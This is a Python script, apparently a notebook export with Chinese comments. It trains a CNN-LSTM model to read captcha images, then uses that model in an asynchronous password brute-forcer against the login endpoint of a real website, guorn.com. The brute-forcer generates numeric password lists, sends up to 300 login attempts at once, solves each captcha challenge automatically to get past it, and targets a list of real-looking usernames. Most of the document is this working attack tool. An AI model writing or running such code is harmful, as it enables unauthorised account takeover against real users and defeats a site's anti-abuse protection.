

import torch
import torch.nn as nn
import torch.nn.functional as F
from torch.utils.data import Dataset, DataLoader
from torchvision.transforms.functional import to_tensor, to_pil_image

from captcha.image import ImageCaptcha
from tqdm import tqdm
import random
import numpy as np
from collections import OrderedDict

import string
characters = string.digits + string.ascii_uppercase + string.ascii_lowercase
# characters =  string.ascii_uppercase + string.ascii_lowercase
width, height, n_len, n_classes = 164, 60, 4, len(characters)
# n_input_length = 12
n_input_length = 10
print('\n')
print(characters, width, height, n_len, n_classes)

class CaptchaDataset(Dataset):
    def __init__(self, characters, length, width, height, input_length, label_length):
        super(CaptchaDataset, self).__init__()
        self.characters = characters
        self.length = length
        self.width = width
        self.height = height
        self.input_length = input_length
        self.label_length = label_length
        self.n_class = len(characters)
        self.generator = ImageCaptcha(width=width, height=height)

    def __len__(self):
        return self.length
    
    def __getitem__(self, index):
        random_str = ''.join([random.choice(self.characters[1:]) for j in range(self.label_length)])
        image = to_tensor(self.generator.generate_image(random_str))
        target = torch.tensor([self.characters.find(x) for x in random_str], dtype=torch.long)
        input_length = torch.full(size=(1, ), fill_value=self.input_length, dtype=torch.long)
        target_length = torch.full(size=(1, ), fill_value=self.label_length, dtype=torch.long)
        return image, target, input_length, target_length

dataset = CaptchaDataset(characters, 1, width, height, n_input_length, n_len)
image, target, input_length, label_length = dataset[0]
print(''.join([characters[x] for x in target]), input_length, label_length)
to_pil_image(image)


batch_size = 128
train_set = CaptchaDataset(characters, 1000 * batch_size, width, height, n_input_length, n_len)
valid_set = CaptchaDataset(characters, 100 * batch_size, width, height, n_input_length, n_len)
# train_loader = DataLoader(train_set, batch_size=batch_size, num_workers=12)
# valid_loader = DataLoader(valid_set, batch_size=batch_size, num_workers=12)
train_loader = DataLoader(train_set, batch_size=batch_size, num_workers=6)
valid_loader = DataLoader(valid_set, batch_size=batch_size, num_workers=6)


class Model(nn.Module):
    def __init__(self, n_classes, input_shape=(3, 64, 128)):
        super(Model, self).__init__()
        self.input_shape = input_shape
        channels = [32, 64, 128, 256, 256]
        layers = [2, 2, 2, 2, 2]
        kernels = [3, 3, 3, 3, 3]
        pools = [2, 2, 2, 2, (2, 1)]
        modules = OrderedDict()
        
        def cba(name, in_channels, out_channels, kernel_size):
            modules[f'conv{name}'] = nn.Conv2d(in_channels, out_channels, kernel_size,
                                               padding=(1, 1) if kernel_size == 3 else 0)
            modules[f'bn{name}'] = nn.BatchNorm2d(out_channels)
            modules[f'relu{name}'] = nn.ReLU(inplace=True)
        
        last_channel = 3
        for block, (n_channel, n_layer, n_kernel, k_pool) in enumerate(zip(channels, layers, kernels, pools)):
            for layer in range(1, n_layer + 1):
                cba(f'{block+1}{layer}', last_channel, n_channel, n_kernel)
                last_channel = n_channel
            modules[f'pool{block + 1}'] = nn.MaxPool2d(k_pool)
        modules[f'dropout'] = nn.Dropout(0.25, inplace=True)
        
        self.cnn = nn.Sequential(modules)
        self.lstm = nn.LSTM(input_size=self.infer_features(), hidden_size=128, num_layers=2, bidirectional=True)
        self.fc = nn.Linear(in_features=256, out_features=n_classes)
    
    def infer_features(self):
        x = torch.zeros((1,)+self.input_shape)
        x = self.cnn(x)
        x = x.reshape(x.shape[0], -1, x.shape[-1])
        return x.shape[1]

    def forward(self, x):
        x = self.cnn(x)
        x = x.reshape(x.shape[0], -1, x.shape[-1])
        x = x.permute(2, 0, 1)
        x, _ = self.lstm(x)
        x = self.fc(x)
        return x

def train(model, optimizer, epoch, dataloader):
    model.train()
    loss_mean = 0
    acc_mean = 0
    with tqdm(dataloader) as pbar:
        for batch_index, (data, target, input_lengths, target_lengths) in enumerate(pbar):
            data, target = data.cuda(), target.cuda()
            
            optimizer.zero_grad()
            output = model(data)
            
            output_log_softmax = F.log_softmax(output, dim=-1)
            loss = F.ctc_loss(output_log_softmax, target, input_lengths, target_lengths)
            
            loss.backward()
            optimizer.step()

            loss = loss.item()
            acc = calc_acc(target, output)
            
            if batch_index == 0:
                loss_mean = loss
                acc_mean = acc
            
            loss_mean = 0.1 * loss + 0.9 * loss_mean
            acc_mean = 0.1 * acc + 0.9 * acc_mean
            
            pbar.set_description(f'Epoch: {epoch} Loss: {loss_mean:.4f} Acc: {acc_mean:.4f} ')

def valid(model, optimizer, epoch, dataloader):
    model.eval()
    with tqdm(dataloader) as pbar, torch.no_grad():
        loss_sum = 0
        acc_sum = 0
        for batch_index, (data, target, input_lengths, target_lengths) in enumerate(pbar):
            data, target = data.cuda(), target.cuda()
            
            output = model(data)
            output_log_softmax = F.log_softmax(output, dim=-1)
            loss = F.ctc_loss(output_log_softmax, target, input_lengths, target_lengths)
            
            loss = loss.item()
            acc = calc_acc(target, output)
            
            loss_sum += loss
            acc_sum += acc
            
            loss_mean = loss_sum / (batch_index + 1)
            acc_mean = acc_sum / (batch_index + 1)
            
            pbar.set_description(f'Test : {epoch} Loss: {loss_mean:.4f} Acc: {acc_mean:.4f} ')

def decode(sequence):
    a = ''.join([characters[x] for x in sequence])
    s = ''.join([x for j, x in enumerate(a[:-1]) if x != characters[0] and x != a[j+1]])
    if len(s) == 0:
        return ''
    if a[-1] != characters[0] and s[-1] != a[-1]:
        s += a[-1]
    return s

def decode_target(sequence):
    return ''.join([characters[x] for x in sequence]).replace(' ', '')

def calc_acc(target, output):
    output_argmax = output.detach().permute(1, 0, 2).argmax(dim=-1)
    target = target.cpu().numpy()
    output_argmax = output_argmax.cpu().numpy()
    a = np.array([decode_target(true) == decode(pred) for true, pred in zip(target, output_argmax)])
    return a.mean()

model = Model(n_classes, input_shape=(3, height, width))
inputs = torch.zeros((32, 3, height, width))
outputs = model(inputs)
outputs.shape


device = torch.device('cpu')

# the_model = Model(n_classes, input_shape=(3, height, width))

# themodel_dict=torch.load('ctc_200916.pth', map_location=device)

the_model=torch.load('ctc_200914.pth', map_location=device)

# dataset = CaptchaDataset(characters, 1, 160, 40, 10, 4)

# random_str = ''.join([random.choice(characters[1:]) for j in range(4)])
# print(random_str)

# image = to_tensor(self.generator.generate_image(random_str))
# image =  ImageCaptcha(width=160, height=40).generate_image(random_str)

# 载入本地图片，用张量表示
from PIL import Image
image_local1=Image.open('c:/3.png')
# image_local1.show()
image_local1_tensor=to_tensor(image_local1)
# print(image_local1)
# print(image_local1_tensor)
to_pil_image(image_local1_tensor)

# 解码本地图片
# output = the_model(image_local1_tensor.unsqueeze(0).cuda())
output = the_model(image_local1_tensor.unsqueeze(0).cpu()) #从cuda切换到cpu无法正确显示
output_argmax = output.detach().permute(1, 0, 2).argmax(dim=-1)
print('pred:', decode(output_argmax[0]))


import asyncio
import aiohttp
import time
import json
import itertools
from io import BytesIO

# 防止错误：event_loop close
import nest_asyncio
nest_asyncio.apply()

# result = itertools.product("0123456789abcdefghijklmnopqrstuvwxyz",repeat=4)
result = itertools.product("0123456789",repeat=2)
# result = itertools.product("0123456789",repeat=3)

# 这里不要用静态密码，最好用生成器的方式，每次生成一个
# passwordlist = list(result)[100000:]
# passwordlist = list(result)[210:]
passwordlist = list(result)
# print(l)  #小心MemoryError：内存溢出
# len_pwdlist=len(passwordlist)

# print("".join(passwordlist[0]))

# 列表推导式生成，将(1,1,1)变为111
passwordlist=["".join(passwordlist[i]) for i in range(len(passwordlist))]

passwordlist.append('arong')
passwordlist.append('aronq')

len_pwdlist=len(passwordlist)
# print(passwordlist)
# print(len_pwdlist)
# passwordlist[-1:]
accountlist=["阿荣"]
account_len=len(accountlist)
# print(account_len)
loginresult=False
global retrynumber
retrynumber=0
# print('共有',len_pwdlist,'个密码')

def GetPasswords(startlayer,endlayer):
    passwordlist=[]
    startlayer=startlayer
    endlayer=endlayer+1
    # result1 = itertools.product("0123456789",repeat=1)
    # result2 = itertools.product("0123456789",repeat=2)
    # result3 = itertools.product("0123456789",repeat=3)
    # result4 = itertools.product("0123456789",repeat=4)
    # result5 = itertools.product("0123456789",repeat=5)
    # result6 = itertools.product("0123456789",repeat=6)

    for iLayer in range(startlayer,endlayer):
        newproduct=list(itertools.product("0123456789",repeat=iLayer))
        newlist=["".join(newproduct[i]) for i in range(len(newproduct))]
        passwordlist=passwordlist+newlist

    
    passwordlist.append('arong')
    passwordlist.append('aronq')
    passwordlist=passwordlist[1:]
    print("共有密码：",len(passwordlist))
    print('前5个密码：',passwordlist[:5])
    print('后5个密码：',passwordlist[-5:-1])
    return passwordlist

passwordlist=GetPasswords(2,2)

import tqdm

accountlist=['巴依老爷','穿过迷雾','牛涛188','粤深侯','增涨黑客','赵康-海口国贸大道',
             'wenleixu88','一抹红','efem2000','小嘻嘻','相识是缘','就叫小鸡吧','agu',
             'jackoncheung77','失意者','非胡爱涨停','希望之雨','如月','zhouzhenyi',
             '视网推客','在风中','yunxiang','逍遥一世','niu522','招财密码','飞','fengs',
             '波波维奇','甘〔•〕泉','果核木白','念想','牛金牛','88shaoye','Demo','张狗-果仁网',
             'lidl-果仁网','果汁-榨汁机','chuntiansitu','阿尔法贝塔','毛利哥','单因子策略',
             '交易工匠','在风中','小鸟一只','貔貅01','sheyoutian','球爷','持有封基','guo123nie','小球球']
# accountlist=["巴依老爷",'穿过迷雾',"阿荣"]
accountlist=["阿荣"]
# accountlist=["巴依老爷"]

# 定义一个函数，用于获取responsetext

async def get_password(accountname,currentpassword,semaphore):
    retrynumber=0
    
    solveflag=False

    while solveflag==False:
        # sem = asyncio.Semaphore(2)
        async with semaphore:

            async with aiohttp.ClientSession() as session:
                # login_data = {"account":accountname,"passwd":currentpassword,"keep_login":"false","code":None,"cloud_login":None}
                login_data = {"account":accountname,"passwd":currentpassword}
                # start=time.time()

                response = await session.post('https://guorn.com/user/login',data=json.dumps(login_data))
                # print('response:',response)
                # print(response.status_code)
                # print("login response:", response.text)
                responsetext=await response.text()
                # print('response text:',responsetext)
                j = json.loads(responsetext) 
                
                loginstatus = j.get('status')
                # print('密码:',currentpassword ,';loginstatus:',loginstatus)
                # print('login results:',loginstatus )

                # stop=time.time()
                # print('执行时间1-访问login：',stop-start)
                
                
                if loginstatus=='ok':
                    # correctpassword=passwordlist[retrynumber]
                    
                    retrynumber=retrynumber+1
                    print('==============================')
                    print('正确密码：',currentpassword)
                    print('==============================')
                    # print('task_func was canceled')
                    solveflag=True
                    
                    raise asyncio.CancelledError
                    # break
                # 显示用户名密码错误则退出重新开始新密码
                elif loginstatus=='info':
                    # print('显示用户名密码错误。开始下一个密码')
                    # pass
                    solveflag=True

                elif loginstatus=='need_captcha':
                    # 
                    # raise
                    solveflag=False

                    correctcaptcha=False

                    while correctcaptcha==False:
                        login_data ={"api":"/user/login"}

                        response = await session.post('https://guorn.com/captcha/create',data=json.dumps(login_data))
                        # print(response.status_code)
                        # print(response.text)
                        responsetext=await response.text()
                        j = json.loads(responsetext) #解析之后的类型为字典类型
                        results = j.get('data').get('url')
                        # print(results)
                        picurl="https://www.guorn.com"+results
                        # print(picurl)

                        # 下载图片并且显示
                        # 这里耗时很大
                        response = await session.get(picurl)
                        # print('image response:',response)
                        # ！！！！！和同步的关键区别在于response.content、await response.read()
                        # image_local1 = Image.open(BytesIO(response.content))
                        image_local1 = Image.open(BytesIO(await response.read()))
                        # print(image_local1)
                        # image_local1.show

                        # stop=time.time()
                        # print('执行时间2-读取图片：',stop-start)

                        image_local1_tensor=to_tensor(image_local1)
                    
                        # 解码本地图片
                        output = the_model(image_local1_tensor.unsqueeze(0))
                        output_argmax = output.detach().permute(1, 0, 2).argmax(dim=-1)
                        validatecode=decode(output_argmax[0])

                        # stop=time.time()
                        # print('执行时间3-图片分析：',stop-start)

                        # print('预测码:', validatecode)

                        # 进行验证
                        login_data ={"captcha":validatecode}
                        response = await session.post('https://guorn.com/captcha/validate',data=json.dumps(login_data))

                        # print('captcha response status_code:' ,response.status_code)
                        # print('captcha response text:' ,response.text)

                        responsetext=await response.text()
                        j = json.loads(responsetext) 
                        captcharesult = j.get('status')
                        # print('验证码状态:',captcharesult )

                        # stop=time.time()
                        # print('执行时间4-验证图片：',stop-start)

                        if captcharesult=='ok':
                            correctcaptcha=True
                            # print('验证码正确 for 密码：',currentpassword)
                        else:
                            # print('验证码错误 for 密码：',currentpassword)
                            pass

                    #控制尝试次数
                    # retrynumber=retrynumber+1
                    # print('尝试次数',retrynumber)
                    await asyncio.sleep(0.1)


# def task_canceller(t):
#     print('in task_canceller')
#     t.cancel()
    

# async def main(loop):

#     print('creating task')

#     task = loop.create_task(test_password())

#     loop.call_soon(task_canceller, task)

#     try:
#         await task
#     except asyncio.CancelledError:
#         print('main() also sees task as canceled')


async def run():
    
    # accountnumber=0
    # accountname=accountlist[accountnumber]
    # pbar = tqdm.tqdm(total=len(passwordlist))

    for accountname in accountlist:
        print('===========用户名==============')
        print(accountname)
        semaphore = asyncio.Semaphore(300) # 限制并发量为500
        getpwdfunc_list = [get_password(accountname,str,semaphore) for str in passwordlist]  
        await asyncio.wait(getpwdfunc_list)

async def run_tqdm():
    
    # accountnumber=0
    # accountname=accountlist[accountnumber]
    pbar = tqdm.tqdm(total=len(passwordlist))

    for accountname in accountlist:
        # print('===========用户名==============')
        # print(accountname)
        semaphore = asyncio.Semaphore(300) # 限制并发量为500
        getpwdfunc_list = [get_password(accountname,str,semaphore) for str in passwordlist]  
        
        for f in asyncio.as_completed(getpwdfunc_list):
            value = await f
            pbar.set_description(value)
            pbar.update()
        # await asyncio.wait(getpwdfunc_list)



async def tq(flen):
    for _ in tqdm.tqdm(range(flen)):
        await asyncio.sleep(0.1)


# async def main_tqdm():
#     # Schedule the three concurrently
#     print('共有', len(passwordlist),'个密码')
#     flist = [factorial("A", 2),
#              factorial("B", 3),
#              factorial("C", 4)]

#     pbar = tqdm.tqdm(total=len(flist))
#     for f in asyncio.as_completed(flist):
#         value = await f
#         pbar.set_description(value)
#         pbar.update()

async def main():
    print('共有', len(passwordlist),'个密码')
    try:
        loop = asyncio.get_event_loop()
        # loop.run_until_complete(run())
        loop.run_until_complete(run())

        # loop.run_until_complete(asyncio.wait(getpwdfunc_list))
    except  asyncio.CancelledError:
        print('找到密码')
    finally:
        # loop.close()
        pass

if __name__ == '__main__':
    # asyncio.run(main())
    
    start=time.time()

# loop = asyncio.get_event_loop()   
    # await main()
    main()

    stop=time.time()
    print('执行时间：',stop-start) # 
    

# if __name__ == '__main__':
# #    now=lambda :time.time()
#     try:
#         loop = asyncio.get_event_loop()
#         loop.run_until_complete(run())

#         # loop.run_until_complete(asyncio.wait(getpwdfunc_list))
#     except  asyncio.CancelledError:
#         print('找到密码')
#     finally:
#         loop.close()
#         pass

# getpwdfunc_list = (test_password(str) for str in passwordlist)
# getpwdfunc_list = [asyncio.ensure_future(test_password(str)) for str in passwordlist]

    # loop.run_until_complete(main(loop))
    # loop.run_until_complete(asyncio.gather(*getpwdfunc_list)) # ???


# try:
#     loop.run_forever()
# except KeyboardInterrupt:
#     print('Stopping...')
# finally: 
#     loop.close()
